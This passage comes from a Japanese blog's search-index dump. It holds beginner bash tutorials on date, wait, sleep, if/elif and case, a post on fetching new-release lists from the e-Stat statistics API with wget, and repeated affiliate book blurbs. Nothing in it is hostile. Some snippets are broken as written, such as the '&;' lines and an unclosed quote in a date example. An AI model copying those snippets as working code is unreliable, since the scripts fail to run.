現在の日付を解析する：\ndateコマンドを使用して、現在のシステムの日付と時刻の値を取得することができます。日付と時刻は、「Y」、「m」、「d」、「H」、「M」、および「S」を使用します。\u0026lsquo;date_parse.sh\u0026rsquo;という名前の新しいファイルを作成し、次のコードを追加して、日、月、年、時、分、秒の値を表示します。\n#!/bin/bash Year=`date +%Y`; Month=`date +%m`; Day=`date +%d`; Hour=`date +%H`; Minute=`date +%M`; Second=`date +%S`; echo `date`; echo \u0026#34;Current Date is: $Day-$Month-$Year\u0026#34;; echo \u0026#34;Current Time is: $Hour:$Minute:$Second\u0026#34;; bashコマンドでファイルを実行します。\n$ bash date_parse.sh 2022年 1月13日 木曜日 12時19分06秒 JST Current Date is: 13-01-2022 Current Time is: 12:19:06 $ ヒント dateコマンドは覚えるのではなく、manコマンドで都度、探しましょう。きりがないです。できる事を覚えておけばオッケーです。以下にありきたりなパターンを列挙しておきます。 $ date \u0026#39;+%Y/%m/%d\u0026#39; 2005/09/11 $ date \u0026#39;+%Y/%m/%d(%a)\u0026#39; 2005/09/11(Sun) $ date \u0026#39;+%y/%m/%d\u0026#39; 05/09/11 $ date \u0026#39;+%F\u0026#39; 2005-09-11 $ date \u0026#39;+%D\u0026#39; 09/11/05 $ date \u0026#39;+%R\u0026#39; 01:18 $ date \u0026#39;+%T\u0026#39; 01:18:01 $ date \u0026#39;+%r\u0026#39; 01:18:06 AM $ date \u0026#39;+%Y/%m/%d%n%r\u0026#39; 2005/09/11 01:18:27 AM #↑%n を使用することで、出力に改行を含めることができる。 # 1日後 $ date -d \u0026#39;1 day\u0026#39; # 2日後 $ date -d \u0026#39;2 days # 1日前 $ date -d \u0026#39;1 day ago\u0026#39; # 1ヶ月前 $ date -d \u0026#39;1 month ago\u0026#39; # 1年前 $ date -d \u0026#39;1 year ago\u0026#39; # 1時間前 $ date -d \u0026#39;1 hour ago\u0026#39; # 1分前 $ date -d \u0026#39;1 minute ago\u0026#39; # 1秒前 $ date -d \u0026#39;1 second ago\u0026#39; $ IFSBK=${IFS} ; IFS=$\u0026#39;\\n\u0026#39; ; for record in $(cat /var/log/messages ) ; do if [ $(( $(date +\u0026#34;%s\u0026#34;) - 300 )) -lt $(echo ${record} | cut -d\u0026#34; \u0026#34; -f 1,2,3 | date --date=\u0026#34;$(cat -)\u0026#34; +\u0026#34;%s\u0026#34;) ] ; then echo ${record} ; fi ; done | grep error ; IFS=${IFSBK} waitコマンド waitコマンド：\nwaitコマンドは、実行中のプロセスの完了を待機するLinuxの組み込みコマンドです。 waitコマンドは、特定のプロセスIDまたはジョブIDで使用されます。waitコマンドでプロセスIDまたはジョブIDが指定されていない場合、現在のすべての子プロセスが完了するのを待機し、終了ステータスを返します。\u0026rsquo; wait_example.sh\u0026rsquo;という名前のファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;Wait command\u0026#34; \u0026amp; process_id=$! wait $process_id echo \u0026#34;Exited with status $?\u0026#34; bashコマンドでファイルを実行します。\n$ bash wait_example.sh Wait command Exited with status 0 $ わかりにくいですね。\nもう少しわかりやすく説明します。\nwaitコマンドは、他のプロセスの終了まで待機することができるコマンドです。\n例えば、以下三つのファイルを実行します。\n末尾に \u0026amp; がついているのは、それぞれの実行ファイルをバックグラウンドで並列で実行させることを意味しています。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; では、三つの実行ファイルが全て完了したらコメントを出力するソースに書き直してみます。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; echo \u0026#34;終了しました\u0026#34;; 上記のソースは、実行の終了を待たずに「終了しました」が出力されます。要するに、コメントの出力は全ての実行を待っていない訳です。正しいソースに書き直してみます。\n#!/bin/bash bash a.sh \u0026amp;; bash b.sh \u0026amp;; bash c.sh \u0026amp;; wait; echo \u0026#34;終了しました\u0026#34;; 上記のようにwaitコマンドを挟むことで、a.sh, b.sh, c.sh の実行が終了してから完了メッセージを表示させることが出来ました。\n前の処理終了を待ってから、次の処理を実行する方法は以下の通りです。\n#!/bin/bash command1 \u0026amp; command2 \u0026amp; wait command3 上記の様にすると、command1とcommand2が終了してからcommand3が実行される様にできます。command1と2がバックグラウンドで実行され、waitコマンドで処理終了まで待機し、command3が実行されるといった流れです。\nヒント waitコマンドと似ているsleepコマンドについて、次の章で説明します。またsleepコマンドとwaitコマンドを組み合わせて並列処理を行うサンプルも次の章で示します。 sleepコマンド sleepコマンド：\nコマンドの実行を特定の期間一時停止する場合は、sleepコマンドを使用できます。遅延量は、 秒（s）、分（m）、時間（h）、および日（d）で設定できます。\u0026lsquo;sleep_example.sh\u0026rsquo; という名前のファイルを作成し、次のスクリプトを追加します。このスクリプトは、実行後5秒間待機します。\n#!/bin/bash echo “Wait for 5 seconds” sleep 5 echo “Completed” bashコマンドでファイルを実行します。\n$ bash sleep_example.sh “Wait for 5 seconds” “Completed” $ わかりにくいですね。\n少し高度だけど、わかりやすいサンプルも書いておきます。\nwait コマンドのサンプル sleep コマンドをバックグラウンドで実行させ、前の章で使ったwait コマンドで同期をとります。。バックグランドで実行したコマンドのプロセス ID は $! で取得できます。\n#!/bin/bash for((i=0;i\u0026lt;3;i++));do sleep 5 \u0026amp;; array[i]=$!; echo \u0026#34;Sleeping: ${i} : ${array[i]}\u0026#34;; done wait ${array[@]}; echo \u0026#34;Finish!!\u0026#34;; ヒント 二つのコマンドの違いは以下の通りです。 sleepは指定した時間だけ処理を遅延 waitはプロセスやジョブの終了を待つ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/","title":"【はじめから】ざっくりわかるシェルスクリプト３"},{"content":"e-Statで新着一覧を取得しよう 毎日自動的に処理できるようにしたいので新着一覧を取得する必要があります。\n新着一覧は、リスト取得用のAPIでupdateDateに日付を指定してその日の更新分を取得してくるようにしました。\nwget \u0026#34;https://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsList?updatedDate=20220111\u0026amp;appId=xxxxxxxxxxxx\u0026amp;lang=J\u0026#34; -O new.csv STAT_CODEが政府統計コード、TABLE_INFがデータセットIDになります。\n\u0026#34;0003254482\u0026#34;,\u0026#34;00552010\u0026#34;,\u0026#34;知的財産活動調査\u0026#34;,\u0026#34;00552\u0026#34;,\u0026#34;特許庁\u0026#34;,\u0026#34;知的財産活動調査\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;1-1\u0026#34;,\u0026#34;業種別出願件数階級別 売上高、営業利益高、経常 利益高、従業者数、研究関係従業者数及び研究費\u0026#34;,\u0026#34;（注1）各設問項目によって標本数が異なるため、例えば研究関係従業者数の集計結果が従業者数の集計結果を上回るなど、大小関係の逆転が生じ得る点に留意する必要がある。（注2）業種 「個人」において売上高等の記載される場合があるが、これは事業を営む個人事業主が調査票の業種を「個人」として回答したことによる。\u0026#34;,\u0026#34;業種別出願件数階級別\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;年 度次\u0026#34;,\u0026#34;0\u0026#34;,\u0026#34;2022-01-11\u0026#34;,\u0026#34;0\u0026#34;,\u0026#34;該当なし\u0026#34;,\u0026#34;0\u0026#34;,\u0026#34;2022-01-11\u0026#34;,\u0026#34;11\u0026#34;,\u0026#34;情報通信・科学技術\u0026#34;,\u0026#34;03\u0026#34;,\u0026#34;知的財産\u0026#34; データセットID（TABLE_INF）を使って個別データを取得しましょう。\nwget \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003254482\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; -O 0003254482.csv 知的財産活動調査とは 今日の課題は新着一覧に出てきた「知的財産活動調査」をどう処理するか検討してみましょう。\n知的財産活動調査は、我が国における知的財産活動の現状を定量的に把握することを目的とした一般統計調査とのことです。\n特許権などの利用状況を調査したものみたいです。\nデータセット 知的財産活動調査のデータセット数ですが１４０件もあります。\n統計のデータセット数は１つの時もあればこのように１００を超える時もあるみたいです。\nこれだけデータセット数が多いとこの中から主要なデータセットを選択してサマリーを作成するのは大変ですね。\ngoogle検索で「知的財産活動調査」の分析記事を調べてみると\nhttps://www.semiconportal.com/archive/editorial/industry/17.html\n知的財産担当者数は増加傾向にあり、2004年度は、約45,500人で前年度に比べ16.6 ％増加。\n企業等の知的財産活動費は約9,200 億円で前年度に比べ17.1 ％増加。\n特許権の活用状況 国内における2004年度の特許権の利用率は48.2 ％であり、依然として所有する権利の約半数が利用されていないことがわかる。\nhttps://www.jstage.jst.go.jp/article/jasmin/2018s/0/2018s_246/_article/-char/ja/\n研究開発活動が利益率に対して最も顕著なプラスの効果を持っていたのは「医薬品製造業」であった．また，研究費投資から利益率向上には25年程度のラグがあることも示された\n「知的財産担当者数」「知的財産活動費」「特許権の利用率」あたりがよく出るキーワードみたいです。\n主要なキーワードの抽出方法なのですが、「知的財産活動調査」のように統計名でgoogle検索した結果に対して、「知的財産担当者数」「知的財産活動費」などのデータセット名で検索して件数が多いものを主要なキーワードとして取り扱うことができるか検討してみたいと思います。\n「利益率」という面白いキーワードがあったのですが、統計の中にはそのままのデータはありませんでした。「経常利益高」という項目があるのでこれを「知的財産活動費」で割り算する必要がありそうです。\n「利益率」が出せそうなら出してみるというのも検討してみると面白いかもしれません。\n主要なキーワードとしては、「知的財産担当者数」「知的財産活動費」「特許権の利用率」のようにその統計に固有のものもありますが、「利益率」「担当者数」「費用」「利用率」など汎用的に重要な項目もあるのかなと思いました。\nデータセットの先頭にある「売上高、営業利益高、経常利益高、従業者数、研究関係従業者数及び研究費」は「特許権の利用率」は含まないものの「経常利益高」「知的財産担当者数」「知的財産活動費」を含むものでした。\nデータセットが大量にある統計の場合先頭のデータセットはまとめ的なデータになるのでしょうか。他の統計も見てみようと思います。\nデータセットの中に「標本数」というものがありました。「標本数」は、アンケート結果の回収数です。データの信用性を図る上では大切な項目ですが、サマリーを作成する際は除外しても良い項目かもしれません。\n知的財産担当者数 知的財産活動費 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T13:40:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/","title":"e-Statで新着一覧を取得しよう"},{"content":"or 条件を if文で使う orロジックでifステートメントを使用する：\n\u0026lsquo;||\u0026lsquo;は、ifステートメントでorロジックを定義するために使用されます。次のコードを使用して「if_with_or.sh」という名前のファイルを作成し、ifステートメントのorロジックの使用を確認します。ここで、nの値はユーザーから取得されます。値が15または45の場合、出力は「ゲームに勝ちました」になります。それ以外の場合、出力は「ゲームに負けました」になります。\n#!/bin/bash echo \u0026#34;数値を入力して下さい。\u0026#34;; read n; if [[ (\u0026#34;$n\u0026#34; -eq 15 || \u0026#34;$n\u0026#34; -eq 45) ]];then echo \u0026#34;ゲームに勝ちました\u0026#34;; else echo \u0026#34;ゲームに負けました\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash if_with_or.sh 数値を入力して下さい。 5 ゲームに負けました $ bash if_with_or.sh 数値を入力して下さい。 45 ゲームに勝ちました bash-5.1$ 比較演算子使用例意味 -n-n 文字列\t文字列の長さが0より大きければ真 -z-z 文字列\t文字列の長さが0であれば真 =文字列A = 文字列B\t文字列Aと文字列Bが等しければ真 !=文字列A != 文字列B\t文字列Aと文字列Bが等しくなければ真 ヒント シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。 また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-10-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-10-suzuki/","title":"【１０．or 条件を if文で使う】ざっくりわかる「シェルスクリプト」"},{"content":"else if と else else ifステートメントの使用：\nelse if条件の使用は、bashでは「elif」を定義します。\u0026rsquo;elseif_example.sh\u0026rsquo;という名前のファイルを作成し、次のスクリプトを追加して、bashスクリプトでelseifがどのように定義されているかを確認します。\n#!/bin/bash echo \u0026#34;あなたのラッキーナンバーを入力して下さい。\u0026#34;; read n; if [ \u0026#34;$n\u0026#34; -eq 101 ];then echo \u0026#34;あなたは一等賞を獲得しました\u0026#34;; elif [ \u0026#34;$n\u0026#34; -eq 510 ];then echo \u0026#34;あなたは二等賞を獲得しました\u0026#34;; elif [ \u0026#34;$n\u0026#34; -eq 999 ];then echo \u0026#34;あなたは三等賞を獲得しました\u0026#34;; else echo \u0026#34;すみません、またチャレンジして下さい\u0026#34;; fi bashコマンドでファイルを実行します。\nbash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 101 あなたは一等賞を獲得しました bash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 999 あなたは三等賞を獲得しました bash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 100 すみません、またチャレンジして下さい bash$ bash elseif_example.sh $ 比較演算子使用例意味 -n-n 文字列\t文字列の長さが0より大きければ真 -z-z 文字列\t文字列の長さが0であれば真 =文字列A = 文字列B\t文字列Aと文字列Bが等しければ真 !=文字列A != 文字列B\t文字列Aと文字列Bが等しくなければ真 ヒント シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。 また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-11-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-11-suzuki/","title":"【１１．else if と else】ざっくりわかる「シェルスクリプト」"},{"content":"case 文 caseステートメントの使用：\ncaseステートメントは、if-elseif-elseステートメントの代わりに使用されます。このステートメントの開始ブロックと終了ブロックは、「case」と「esac」によって定義されます。\u0026lsquo;case_example.sh\u0026rsquo;という名前の新しいファイルを作成し、次のスクリプトを追加します。次のスクリプトの出力は、例として前のelseと同じになります。\n#!/bin/bash echo \u0026#34;あなたのラッキーナンバーを入力して下さい。\u0026#34;; read n; case \u0026#34;$n\u0026#34; in 101) echo \u0026#34;あなたは一等賞を獲得しました\u0026#34; ;; 510) echo \u0026#34;あなたは二等賞を獲得しました\u0026#34; ;; 999) echo \u0026#34;あなたは三等賞を獲得しました\u0026#34; ;; *) echo \u0026#34;すみません、またチャレンジして下さい\u0026#34; esac bashコマンドでファイルを実行します。\nbash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 101 あなたは一等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 510 あなたは二等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 999 あなたは三等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 777 すみません、またチャレンジして下さい ヒント case文の終わりには esac を指定します。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS 